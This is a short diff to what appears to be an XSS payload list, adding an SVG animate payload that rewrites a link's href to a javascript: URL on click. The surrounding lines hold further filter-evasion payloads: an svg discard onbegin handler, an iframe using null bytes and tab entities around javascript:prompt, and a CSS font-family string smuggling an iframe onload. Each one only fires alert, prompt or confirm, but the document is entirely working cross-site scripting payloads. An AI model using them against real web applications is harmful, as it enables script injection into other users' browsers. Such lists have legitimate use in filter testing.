@@ -1,4 +1,5 @@
 # xss-payload
+<svg><a id='xss'><animate begin="xss.click" attributeName="href" dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://ahihihihihi.net;javascript:alert(1);0" /><text x=20 y=20>Click me</text></a></svg>
 <svg><discard onbegin=alert(1)>
  <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
